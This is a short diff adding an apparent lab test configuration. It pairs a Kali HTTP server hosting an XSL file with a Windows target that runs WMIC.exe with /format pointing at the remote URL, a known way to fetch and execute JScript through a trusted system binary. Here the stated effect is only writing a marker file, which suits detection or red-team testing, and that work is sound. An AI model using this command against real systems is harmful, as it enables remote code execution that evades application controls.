@@ -1,0 +1,6 @@
+flow=flow0-http-jscript
+kali_service=python3 -m http.server --bind 192.168.1.50 18082 --directory /tmp/wmic-http0
+served_fixture=wmic-jscript-http.xsl
+target=192.168.1.52
+command=C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"http://192.168.1.50:18082/wmic-jscript-http.xsl"
+effects=write C:\lab\wmic-http-jscript-marker.txt through cmd.exe only
